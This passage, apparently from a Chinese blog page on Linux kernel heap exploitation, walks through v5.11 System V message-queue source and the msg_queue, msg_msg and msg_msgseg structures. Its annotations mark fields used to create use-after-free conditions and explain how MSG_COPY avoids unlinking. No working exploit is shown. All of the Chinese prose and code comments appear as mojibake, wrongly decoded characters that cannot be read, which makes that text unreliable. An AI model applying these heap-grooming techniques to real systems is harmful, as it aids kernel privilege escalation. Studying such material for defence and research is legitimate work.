†å—å†…å­˜</span></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//è¿›è¡Œç›¸å…³æ³¨å†Œ</span></span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm);</span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä¸‹é¢ä¸€å †çœ‹ä¸æ‡‚åœ¨å¹²å•¥</span></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>åˆ›å»ºçš„ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">    <span class="comment">//è¿™äº›ä¸ºä¸€äº›ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//å­˜æ”¾msg_msgç›¸å…³æŒ‡é’ˆnextã€prev,æ¯”è¾ƒé‡è¦,é€šå¸¸æ‹¿æ¥æº¢å‡ºåˆ¶é€ UAF</span></span><br><span class="line">    <span class="comment">//å’Œè¯¥æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„æ‰€æœ‰æ¶ˆæ¯ç»„æˆåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>æ¥ç€å½“ä½¿ç”¨<code>msgsnd</code>å‡½æ•°ä¼ é€’æ¶ˆæ¯æ—¶ï¼Œä¼šåˆ›å»ºæ–°çš„<code>msg_msg</code>ç»“æ„ä½“ï¼Œæ¶ˆæ¯è¿‡é•¿çš„è¯å°±ä¼šåˆ›å»ºæ›´å¤šçš„<code>msg_msgseg</code>æ¥å­˜å‚¨æ›´å¤šçš„æ¶ˆæ¯ã€‚ç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)-&gt;do_msgsnd()-&gt;load_msg()-&gt;alloc_msg()</span><br></pre></td></tr></table></div></figure>

<p>ä¸»è¦è¿˜æ˜¯å…³æ³¨åœ¨<code>alloc_msg()</code>å‡½æ•°</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æœ€å¤§å‘é€DATALEN_MSGé•¿åº¦çš„æ¶ˆæ¯</span></span><br><span class="line">    <span class="comment">//#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line">    <span class="comment">//è¿™é‡Œçš„PAGE_SIZEä¸º0x400,å³æœ€å¤škmalloc-</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">    <span class="comment">//ä½¿ç”¨æ­£å¸¸</span></span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¦‚æœä¼ å…¥æ¶ˆæ¯é•¿åº¦è¶…è¿‡0x400-0x30,å°±å†è¿›è¡Œç”³è¯·msg_msgsegã€‚</span></span><br><span class="line">    <span class="comment">//ä½¿ç”¨kmallocç”³è¯·,æ ‡å¿—ä¸ºGFP_KERNEL_ACCOUNTã€‚</span></span><br><span class="line">    <span class="comment">//æœ€å¤§ä¹Ÿä¸º0x400,ä¹Ÿå±äºkmalloc-1024</span></span><br><span class="line">    <span class="comment">//è¿˜æœ‰å†é•¿çš„æ¶ˆæ¯,å°±å†ç”³è¯·msg_msgseg</span></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">		<span class="comment">//ä¸çŸ¥é“å¹²å•¥çš„</span></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">        <span class="comment">//ç”³è¯·å®Œä¹‹å,å°†msg_msgsegæ”¾åˆ°msg-&gt;nextè¿™ä¸ªå•å‘é“¾è¡¨ä¸Š</span></span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p><code>msg_msg</code>ç»“æ„ä½“å¦‚ä¸‹ï¼Œå¤´éƒ¨å¤§å°<code>0x30</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//ä¸msg_queueæˆ–è€…å…¶ä»–çš„msg_msgç»„æˆåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//å•å‘é“¾è¡¨ï¼ŒæŒ‡å‘è¯¥æ¡ä¿¡æ¯åé¢çš„msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ‰€ç¤º</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png" alt="image-20220511220130886" style="zoom:80%;" /></li>
<li><p><code>msg_msgseq</code>ç»“æ„å¦‚ä¸‹ï¼Œåªæ˜¯ä¸€ä¸ª<code>struct msg_msgseg*</code>æŒ‡é’ˆ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ‰€ç¤º</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png" alt="image-20220511220627775" style="zoom:80%;" /></li>
</ul>
</li>
</ul>

        <h6 id="ç›¸å…³å†…å­˜ç»“æ„ï¼š"   >
          <a href="#ç›¸å…³å†…å­˜ç»“æ„ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç›¸å…³å†…å­˜ç»“æ„ï¼š" class="headerlink" title="ç›¸å…³å†…å­˜ç»“æ„ï¼š"></a>ç›¸å…³å†…å­˜ç»“æ„ï¼š</h6>
      <p>åœ¨ä¸€ä¸ª<code>msg_queue</code>é˜Ÿåˆ—ä¸‹ï¼Œæ¶ˆæ¯é•¿åº¦ä¸º<code>0x1000-0x30-0x8-0x8-0x8</code></p>
<ul>
<li><p>ä¸€æ¡æ¶ˆæ¯ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png" alt="image-20220511231539231"></p>
</li>
<li><p>ä¸¤æ¡æ¶ˆæ¯ï¼š</p>
<p>ä»¥<code>msg_queue</code>çš„<code>struct list_head q_messages;</code>åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ<code>msg_msg</code>ç»“æ„çš„<code>struct list_head m_list</code>åŸŸä¸²è”æ‰€æœ‰çš„<code>msg_msg</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="æœªå‘½åæ–‡ä»¶"></p>
</li>
</ul>
<p>åŒç†ï¼ŒåŒä¸€ä¸ª<code>msg_queue</code>æ¶ˆæ¯é˜Ÿåˆ—ä¸‹çš„å¤šæ¡æ¶ˆæ¯ä¹Ÿæ˜¯ç±»ä¼¼çš„</p>

        <h6 id="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"   >
          <a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š" class="headerlink" title="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"></a>å†…å­˜ç”³è¯·æ€»ç»“ï¼š</h6>
      <ul>
<li>ä½¿ç”¨<code>msgget()</code>å‡½æ•°åˆ›å»ºå†…æ ¸ç©ºé—´çš„æ¶ˆæ¯é˜Ÿåˆ—ç»“æ„<code>msg_msgseg</code>ï¼Œè¿”å›å€¼ä¸ºæ¶ˆæ¯é˜Ÿåˆ—çš„<code>id</code>æ ‡å¿—<code>queue_id</code><ul>
<li><code>msg_msgseg</code>ç®¡ç†æ•´ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¤§å°ä¸º0x100ï¼Œ<code>kmalloc-256</code>ã€‚</li>
<li>å…¶<code>struct list_head q_messages;</code>åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ<code>msg_msg</code>ç»“æ„çš„<code>struct list_head m_list</code>åŸŸä¸²è”æ‰€æœ‰çš„<code>msg_msg</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨</li>
</ul>
</li>
<li>æ¯æ¬¡åœ¨è¯¥æ¶ˆæ¯é˜Ÿåˆ—<code>queue_id</code>ä¸‹è°ƒç”¨<code>msgsnd()</code>å‡½æ•°éƒ½ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„<code>msg_msg</code>ç»“æ„ï¼Œæ¶ˆæ¯é•¿åº¦å¤§äº<code>0x400-0x30</code>å°±ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„<code>msg_msgseg</code>ç»“æ„<ul>
<li><code>msg_msg</code>ä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼Œä¸<code>msg_queue</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œä¸<code>msg_msgseg</code>å½¢æˆå•å‘é“¾è¡¨å¤§å°æœ€å¤§ä¸º0x400ï¼Œå±äº<code>kmalloc-64</code>è‡³<code>kmalloc-1024</code></li>
<li><code>msg_msgseg</code>ä¹Ÿä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼ŒæŒ‚åœ¨<code>msg_msg</code>å•å‘é“¾è¡¨ä¸­ï¼Œå¤§å°æœ€å¤§ä¸º<code>0x400</code>ï¼Œå±äº<code>kmalloc-16</code>è‡³<code>kmalloc-1024</code>ï¼Œå½“æ¶ˆæ¯é•¿åº¦å¾ˆé•¿æ—¶å°±ä¼šç”³è¯·å¾ˆå¤šçš„å†…æ ¸ç©ºé—´çš„<code>msg_msgseg</code>ç»“æ„ã€‚</li>
</ul>
</li>
</ul>

        <h5 id="B-æ•°æ®å¤åˆ¶"   >
          <a href="#B-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-æ•°æ®å¤åˆ¶" class="headerlink" title="B.æ•°æ®å¤åˆ¶"></a>B.æ•°æ®å¤åˆ¶</h5>
      <p>è°ƒç”¨å®Œ<code>alloc_msg()</code>å‡½æ•°åï¼Œå›åˆ°<code>load_msg()</code>å‡½æ•°æ¥ç€è¿›è¡Œæ•°æ®å¤åˆ¶ï¼Œå‡½æ•°è¿˜æ˜¯æŒºç®€å•çš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å…ˆå¤åˆ¶è¿›msg_msgä¸­å­˜æ”¾æ¶ˆæ¯çš„éƒ¨åˆ†</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//éå†msg_msgä¸‹çš„msg_msgseg,é€ä¸ªå­˜æ”¾æ•°æ®è¿›å»</span></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾"   >
          <a href="#â‘¡é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>ç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)-&gt;SYS_msgrcv()-&gt;ksys_msgrcv()-&gt;do_msgrcv()-&gt;do_msg_fill()-&gt;store_msg()</span><br></pre></td></tr></table></div></figure>

<p>é¦–å…ˆå…³æ³¨ä¸€ä¸‹<code>do_msgrcv()</code>å‡½æ•°ï¼Œé‡Œé¢å¾ˆå¤šä¸œè¥¿éƒ½æ¯”è¾ƒé‡è¦</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mode;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    DEFINE_WAKE_Q(wake_q);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">//è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå‡†å¤‡ä¸€ä¸ªmsg_msgçš„å‰¯æœ¬copy,é€šå¸¸ç”¨æ¥é˜²æ­¢unlink</span></span><br><span class="line">    <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">        <span class="comment">//ä»è¿™é‡Œå¯ä»¥çœ‹å‡º,åŒæ ·ä¹Ÿéœ€è¦è®¾ç½®IPC_NOWAITæ ‡å¿—ä½æ‰ä¸ä¼šå‡ºé”™</span></span><br><span class="line">        <span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        <span class="comment">//è¿™ä¸ªprepare_copy()å‡½æ•°å†…éƒ¨è°ƒç”¨äº†load_msg()å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„msg_msg/msg_msgseg</span></span><br><span class="line">        <span class="comment">//ä¼ å…¥çš„sizeå‚æ•°ä¸ºbufsz,å°±ç”¨æˆ·ç©ºé—´å®é™…éœ€è¦æ¶ˆæ¯çš„é•¿åº¦,é‚£ä¹ˆç”³è¯·çš„å †å—é•¿åº¦å°±å¯å˜äº†</span></span><br><span class="line">        <span class="comment">//ä¸ä¸€å®šæ˜¯è¿™æ¡æ¶ˆæ¯çš„é•¿åº¦,è€Œæ˜¯ç”±æˆ‘ä»¬ç›´æ¥æ§åˆ¶,è™½ç„¶æœ€åä¹Ÿä¼šé‡Šæ”¾æ‰</span></span><br><span class="line">        copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            struct msg_msg *copy;</span></span><br><span class="line"><span class="comment">            </span></span><br><span class="line"><span class="comment">            copy = load_msg(buf, bufsz);</span></span><br><span class="line"><span class="comment">            if (!IS_ERR(copy))</span></span><br><span class="line"><span class="comment">                copy-&gt;m_ts = bufsz;</span></span><br><span class="line"><span class="comment">            return copy;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">            <span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¿™æ ·å°±ä¸ä¼šå°†msg_msgä»msg_queueæ¶ˆæ¯é˜Ÿåˆ—ä¸­è¿›è¡ŒUnlinkæ‘˜é™¤</span></span><br><span class="line">    <span class="comment">//åªæ˜¯é‡Šæ”¾å †å—,åœ¨åç»­çš„ä»£ç ä¸­æœ‰æ˜¾ç¤º</span></span><br><span class="line">    <span 